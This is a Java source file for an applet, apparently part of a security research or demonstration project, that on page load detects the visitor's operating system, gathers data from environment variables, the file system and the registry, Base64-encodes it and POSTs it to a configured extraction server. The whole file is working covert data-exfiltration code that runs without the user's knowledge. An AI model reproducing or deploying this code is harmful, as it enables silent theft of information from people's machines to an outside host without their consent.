package com.googlecode.righettod.cip;

import java.applet.Applet;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Properties;

import javax.xml.bind.DatatypeConverter;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.google.gson.Gson;
import com.googlecode.righettod.cip.vo.ClientInformation;

/**
 * Main applet used to launch data extraction.
 * 
 * @author Dominique Righetto (dominique.righetto@gmail.com)
 * 
 */
@SuppressWarnings("serial")
public class EntryPointApplet extends Applet {

	/** LOGGER */
	private static final Logger LOG = LoggerFactory.getLogger(EntryPointApplet.class);

	/**
	 * {@inheritDoc}
	 * 
	 * @see java.applet.Applet#start()
	 */
	@SuppressWarnings("boxing")
	@Override
	public void start() {
		super.start();
		try {
			long startTime = System.currentTimeMillis();
			// Step 1: Determine data grabber impl. according to OS type
			DataGrabber dg = null;
			String osName = System.getProperty("os.name", "").toLowerCase(Locale.UK);
			if (osName.indexOf("win") >= 0) {
				LOG.debug("=> Windows OS detected");
				dg = new WindowsDataGrabber();
			} else if ((osName.indexOf("mac") >= 0) || (osName.indexOf("darwin") >= 0)) {
				LOG.debug("=> Mac OS detected");
				dg = new MacDataGrabber();
			} else if (osName.indexOf("nux") >= 0) {
				LOG.debug("=> Linux OS detected");
				dg = new LinuxDataGrabber();
			}
			// Step 2: Launch data grabbing
			if (dg != null) {
				List<ClientInformation> dataColl = new ArrayList<>();
				LOG.debug("=> Grab data from environment variables");
				dataColl.addAll(dg.grabFromEnvironmentVariables());
				LOG.debug("=> Grab data from file system");
				dataColl.addAll(dg.grabFromFileSystem());
				LOG.debug("=> Grab data from registry");
				dataColl.addAll(dg.grabFromRegistry());
				LOG.debug("=> Encode grabbed data");
				String data = new Gson().toJson(dataColl);
				data = DatatypeConverter.printBase64Binary(data.getBytes());
				String encodedData = URLEncoder.encode(data, Charset.forName("UTF-8").name());
				String requestBody = "c=" + encodedData;
				// Step 3: Send data to configured server
				LOG.debug("=> Load configuration");
				Properties props = new Properties();
				props.load(this.getClass().getResourceAsStream("/config.properties"));
				URL url = new URL(props.getProperty("extraction.target.url"));
				LOG.debug("=> Send data to '{}'", url.toExternalForm());
				HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
				urlConnection.setDoOutput(true);
				urlConnection.setRequestMethod("POST");
				urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
				urlConnection.setRequestProperty("Content-Length", String.valueOf(requestBody.length()));
				OutputStream os = urlConnection.getOutputStream();
				os.write(requestBody.getBytes());
				os.flush();
				os.close();
				LOG.debug("=> Data sent and HTTP response received is {}", urlConnection.getResponseCode());
				LOG.debug("=> Data extracted in {} ms", (System.currentTimeMillis() - startTime));
			}
		}
		catch (Exception e) {
			LOG.warn("Error durant data extraction !", e);
		}
	}

}
